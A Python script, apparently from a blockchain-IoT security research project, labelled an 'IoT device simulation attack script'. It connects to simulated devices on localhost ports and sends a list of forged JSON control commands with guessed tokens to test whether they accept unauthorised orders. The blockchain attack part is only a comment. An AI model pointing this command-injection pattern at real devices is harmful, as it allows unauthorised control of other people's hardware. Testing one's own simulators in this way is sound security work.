# -*- coding: utf-8 -*-
#!/usr/bin/env python3
"""
Created on Thu Apr 10 11:13:54 2020

@author: Oladayo Luke
"""

#!/usr/bin/env python3
import sys
import socket
import json
from random import randint

class SIOTDSAS(object):
    def __init__(self, nodeId):
        self.nodeId = int(nodeId)
        self.host = '127.0.0.1'
        self.status_interval = 8000000 #flag regulate frequency in main loop
        # Create a TCP/IP socket
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.port_list = [x for x in range(65430, 65440)]

        self.packet = {"id": 1,
                       "content_type": "json",
                       "content_length" : "",
                       "public_key":"",
                       "signature" : "",
                       "ticket":"",
                       "data":""}

    def convert_str_to_dic(self, data):
        # using json.loads() 
        # convert dictionary string to dictionary 
        result = {}
        
        try:
            result =  json.loads(data)
        except OSError as err:
            print('[ERROR] Failed to parse data : {}'.format(err) )
        return result  

    def create_socket_conncection(self, port):
        result =""
        # Connect the socket to the port on the server
        # given by the caller
        try:
            server_address = (self.host, port)
            self.sock.connect(server_address)
            #print(">>>>>>>>>>>>>>>")
            print('[INFO] Connecting to host {} port {}'.format(self.host, port))
            print("")
        except WindowsError as err:
            result =str(err)
            print('[DEBUG] Host {} is not alive at port {}'.format(self.host, port))
        return result

    def attack(self):
        port = self.port_list[self.nodeId]
        message_list = [b'{"token": "a460201b60201c565b6500039b565b60", "message": "turn on led"}', 
                        b'{"token": "a460201b60201c565b6200039b565b60","message": "turn off led"}',
                        b'{"token": "a460201b60201c565b6200039b565b60","message": "led on"}', 
                        b'{"token": "a460201b60201c565b6200039b565b60","message": "led off"}',
                        b'{"token": "a460201b60201c565b6700039b565b60","led": "turn on led"}', 
                        b'{"token": "a460201b60201c565b6200039b565b60","led": "turn off led"}',
                        b'{"token": "a460201b60201c565b6200039b565b60","led": "led on"}', 
                        b'{"token": "a460201b60201c565b6200039b565b60","led": "led off"}',
                        b'{"token": "a460201b60201c565b6200039b565b60","command": "led on"}', 
                        b'{"token": "a460201b60201c565b6800039b565b60","command": "led off"}',
                        b'{"token": "a460201b60201c565b6200039b565b60","command": "turn on led"}', 
                        b'{"token": "a460201b60201c565b6200039b565b60","command": "turn off led"}', 
                        b'{"token": "a460201b60201c565b6200039b565b60","adid": 1, "message":"turn off led"}', 
                        b'{"token": "a460201b60201c565b6400039b565b60","adid": 1, "message":"turn on led"}',
                        b'{"token": "a460201b60201c565b6200039b565b60","adid": 2, "message":"turn off led"}',
                        b'{"token": "a460201b60201c565b6200039b565b60","adid": 2, "message":"turn off led"}',
                        b'{"token": "a460201b60201c565b6300039b565b60","adid": 3, "message":"turn off led"}',
                        b'{"token": "a460201b60201c565b6200039b565b60","adid": 3, "message":"turn off led"}',
                        b'{"token": "a460201b60201c565b6200039b565b60","adid": 4, "message":"turn off led"}',
                        b'{"token": "a460201b60201c565b6100039b565b60","adid": 4, "message":"turn off led"}']

        """
        ////////////////////////////////////////////////////////////
        //               BLOCKCHAIN ATTACKS                       //
        ////////////////////////////////////////////////////////////
        """    
        #Not implemented! To do this we will assume an attacker has
        #been successful with persistence attack and got hold of
        #an account on the blockchain and maybe with group id...
        #sending rogue messages to devices on the network can be
        #demonstrated. Reply attack can also be demonstrated here.


        """
        ////////////////////////////////////////////////////////////
        //               SOCKET ATTACKS                           //
        ////////////////////////////////////////////////////////////
        """     
        if(self.create_socket_conncection(port) == ""):
            try:
                #attack the host with different command combinations....
                for message in message_list:
                    print('[INFO] Sending {!r}'.format(message))
                    print("")
                    self.sock.sendall(message)

                    amount_received = 0
                    amount_expected = len(message)
                    while amount_received < amount_expected:
                        data = self.sock.recv(1024)
                        amount_received += len(data)
                        print('[INFO] Received {!r}'.format(data))
                    print("")
            finally:
                self.sock.close()
        else:
            pass
            #self.port_list.append(port)#insert to the back

                          
if __name__ == "__main__":
    print("############################################################") 
    print("############################################################") 
    print("######### IOT DEVICE SIMULATION ATTACK SCRIPT ##############") 
    print("############################################################") 
    print("############################################################") 
    print()
    #INSTANTIATE OBJECT
    app = SIOTDSAS(sys.argv[1])
    #RUN SCRIPT
    app.attack()
    
